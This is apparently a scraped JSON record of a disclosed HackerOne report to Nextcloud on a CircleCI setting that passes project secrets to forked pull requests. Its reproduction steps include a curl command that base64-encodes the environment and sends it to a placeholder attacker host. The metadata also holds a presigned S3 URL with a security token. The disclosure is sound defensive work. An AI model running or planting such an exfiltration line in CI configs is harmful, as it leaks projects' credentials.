@@ -1,0 +1,216 @@
+{
+  "id": 794407,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTQ0MDc=",
+  "url": "https://hackerone.com/reports/794407",
+  "title": "nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-02-12T11:08:18.357Z",
+  "submitted_at": "2020-02-12T11:08:18.357Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nathand",
+    "url": "/nathand",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-01-29T12:40:33.773Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-01-29T12:40:33.729Z",
+  "team_member_agreed_on_going_public_at": "2021-01-15T16:21:58.464Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nCircleCI allows projects to configure whether builds will run as a result of a pull request from a fork, and also whether these fork PRs have access to the secrets stored in the parent repo's CircleCI settings. When both settings are enabled, and the repo associated with the project allows PRs to come from forks from any user (which Github always allows), then a CircleCI project is vulnerable to leaking secrets. Please see the following for documentation on this:\n\nhttps://circleci.com/docs/2.0/oss/#pass-secrets-to-builds-from-forked-pull-requests\n\nParticularly:\n\n> If you are comfortable sharing secrets with anyone who forks your project and opens a PR, you can enable the Pass secrets to builds from forked pull requests option\n\nI believe the `nextcloud/nextcloud-snap` CircleCI project is configured in a vulnerable state, where both these settings are enabled. To determine this, I have developed an automated technique to query CircleCI projects for various non-sensitive settings including whether secrets are being passed to PRs from forks, although an attacker may be able to determine this by manually inspecting the build logs of fork PRs to the project for signs of credential use, or by simply doing a spray-n-pray, i.e., send in a malicious PR and hope for the best. You can confirm this by accessing the CircleCI dashboard, selecting the `nextcloud/nextcloud-snap` project, clicking on the Settings icon (right side, little cog icon), choosing \"Advanced Settings\", and scrolling down to \"Build forked pull requests\" (should be \"On\") and \"Pass secrets to builds from forked pull requests\" (should be \"On\").\n\nInspecting the `.circleci/config.yml` file for this repo suggests that there may not be any secret values being used, however if you go to a build job such as this one:\n\nhttps://circleci.com/gh/nextcloud/nextcloud-snap/4537\n\nThen expand the \"Preparing Environment Variables\" section, and scroll down to \"Using environment variables from project settings and/or contexts\", you can see that the CircleCI environment has access to `GH_AUTH_TOKEN`, which I'm assuming is a Github auth token. Assuming the worst, and this token grants a high level of access, its exposure using the technique outlined in this report could lead to malicious code being injected into Nextcloud repos, access to private repos etc.\n\nFYI, utilizing CircleCI Contexts may have prevented this configuration from being an issue, however my analysis of the CircleCI config file in this report suggests that Contexts is not being used.\n\nhttps://circleci.com/docs/2.0/contexts/\n\n**Please note:** I did *not* submit any real pull requests to confirm this vulnerability, as I did not want to potentially tip off real attackers, as it would be hard to conduct a proof of concept in a public PR without also risking revealing the vulnerability. However my testing on CircleCI is fairly conclusive that these two configuration settings being enabled are vulnerable.\n\nWith that said, I'm willing to help prove this vulnerability in a more private environment, such as a private Nextcloud Github repository that is configured for CircleCI builds with the same vulnerable configuration outlined in this, which I have access to submit PRs to. The permission model on Github really has no bearing on this vulnerability from what I can tell, so I believe this would be a faithful representation of the vulnerability, without exposing the technique publicly. My Github username is `ndavison` if you wish to do this.\n\n## Steps To Reproduce:\n\n  1. Fork the `nextcloud/nextcloud-snap` repo to a user (e.g. so it ends up as https://github.com/USER/nextcloud-snap).\n  1. Create a new branch in the fork, and modify the `.circleci/config.yml` file so environment variables are exfiltrated, e.g. add `- run: curl https://attacker.com/?env=$(env | base64 | tr -d '\\n')` to a CircleCI step that is executed during the CI build.\n  1. Send the branch in as a PR to `nextcloud/nextcloud-snap`.\n  1. Watch the web logs on `attacker.com` and wait for the environment variables stored in the CircleCI `nextcloud/nextcloud-snap` project to arrive via the query string.\n\n## Supporting Material/References:\n\n  * Please see the attached screenshot (`circleci-vulnerable-config.png`) of the vulnerable configuration state (when visiting \"Advanced Settings\" for a project in the CircleCI dashboard)\n\n## Impact\n\nBy abusing the CircleCI configuration for the project, an attacker would be able to leak environment variables, deployment keys, and other credentials stored within the CircleCI project's settings. In this case it looks like the project might have access to a Github access token.",
+  "weakness": {
+    "id": 87,
+    "name": "Insufficiently Protected Credentials"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 714057,
+      "file_name": "circleci-vulnerable-config.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JiZNvex1A2e6NqQurhGc5x9c?response-content-disposition=attachment%3B%20filename%3D%22circleci-vulnerable-config.PNG%22%3B%20filename%2A%3DUTF-8%27%27circleci-vulnerable-config.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZDB555BX%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T064542Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJGMEQCID2PN4Qk29u045OvamnG4Glod8hmBg43ALJ3vOLQDKWaAiAWioQOM8%2FteuktIf2tyPMtJtFl9%2FMtte3goIebsoTO4iqxBQgHEAMaDDAxMzYxOTI3NDg0OSIMNZaTywg77ouY4YS0Ko4Fnlx07K8AFdlAIB1pp3B299%2B%2FFkgEmmWcLvboTu8rafLQA6kQdhfwe%2Bbbdkval4kXyE381T0GGK3dA1Lj%2Bm0869T7VGDY3FzRLo2f2BIIOCCQvFFcm3hAJNcJQU51BIDaD%2BxBK1eWt99ZNQmmPe9Y0ZX5cE4iSo9GprExdV7k4P064QNN3HvkIOn09Muke9orYWQBczREkbYxqOrW38UGnqhEokVhDjzfp6jQrmPZKELwDvYzc9tVsvbq1BlnEzMeV1EItqxxHFibWyxr%2Bkjqr4ZWIRkI5EphYGMsVAIh%2FAJJhnVJhXKYB%2FnyfbGwS4Qx7Tek6%2F96HGk11xjVq7uAEbJJa6LUSnBncP%2FoUJ%2FmTxG7eIezrpEaiEiDQmsgP1uI8vNxwDWh0YO9URgWfmT5LFD7CcULZatjBTSVxZVcNcf4cmgQm31soNWTiu1MupUeVjuLEMoA4mzBRmz3I1qC%2BbBotmVbX17h5q1mEGBxhwmpeqQhPvUJ5%2BDmUbV1Uec3Rw%2Fpp19crcyG6DHQO91psMpW9sA93vfQmgDSI5H9ptCRp1rUbPrUA2x0GHYQE9CWDS4JqfvAYXT2dAc90UU35k5NrIO0RpDOte%2FG70Hd2qhod4R7y1YSc41Qvtp1W2RT3PgtYbYhJzVye5I%2BrOH2iJO0PlaWM6e8%2BVYzluABVcJ7jDmiUerd9EnE5%2B15DMn1AHpGS8TUa%2Bcv5Z3rj9I4KrPdcE8eGJFOUDFfev%2F%2FOlqYhb%2FLgIYfkcxe%2FNrn3cFjIB8uVhuE8x1fmlvhYEcd40xeGtifvHAZuqQkoBfMPQArsQ6ne3WMdgPN1WJSCbVT%2FvNPixlk8QgdCq3pmG90sGurb%2BV%2BWCsXq4lvNSWbMM2kndIGOrIB0W3lXs1WzTQd66lyUULRniT28raDnhjxQCfY9y0EtwBb5B5OQQIh34RGUQFvIbBzEHGIfCJTvXfX0BlJ1xQzIPm2LkuEwTrzP13Xz%2BI1Qfx4XZtO26SAyKx1%2BLlrf%2F5lm4vfOFO%2Bo%2FNLlUii%2BpntGyw%2FgHgQ0rGfI3rqAw8d47x%2BfYUEsv68ALOvZCCw90oxl3g8Av%2BLoGDe%2B5gGpzav%2BWJpJgDuKm7OuicOvJiT31GMbQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f0b941e718c2fe4166499e2388dc3b3d238b07c0f98e2742de5ea74b9d5f52e8",
+      "file_size": 32262,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-02-14T16:21:58.561Z",
+  "allow_singular_disclosure_after": -169741423.62089807,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "dreyand_",
+    "0xwise",
+    "bytehacker_sg",
+    "an0nim",
+    "the_ancient",
+    "destinedtohack"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 26471,
+      "category": "researcher",
+      "content": "The techniques and tools I used for finding the insecure configuration detailed in this report can be found on my blog at https://nathandavison.com/blog/shaking-secrets-out-of-circleci-builds.",
+      "updated_at": "2021-01-29T12:40:24.044Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 94761,
+        "username": "nathand",
+        "name": "Nathan",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://nathandavison.com",
+        "location": "Australia",
+        "created_at": "2016-07-24T11:01:46.874Z",
+        "url": "https://hackerone.com/nathand",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/5d27521e1b671a8e8bc4f016cace6a876120e5addf7dcc35ae4a5eac091669a9"
+        }
+      }
+    }
+  ],
+  "databaseId": "794407",
+  "votes": 6,
+  "latest_disclosable_activity_at": "2021-01-29T12:40:33.796Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T14:45:42.296846",
+    "source": "https://hackerone.com/reports/794407.json",
+    "report_id": 794407
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTQ0MDc=",
+    "databaseId": "794407",
+    "title": "nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets",
+    "url": "https://hackerone.com/reports/794407",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2021-01-29T12:40:33.773Z",
+    "created_at": "2020-02-12T11:08:18.357Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzg3",
+      "name": "Insufficiently Protected Credentials",
+      "external_id": "cwe-522"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "nathand"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzc5NDQwNw==",
+    "_id": "794407",
+    "disclosed": true,
+    "votes": 6,
+    "latest_disclosable_activity_at": "2021-01-29T12:40:33.796Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTQ0MDc=",
+      "databaseId": "794407",
+      "title": "nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets",
+      "url": "https://hackerone.com/reports/794407",
+      "disclosed_at": "2021-01-29T12:40:33.773Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    }
+  }
+}
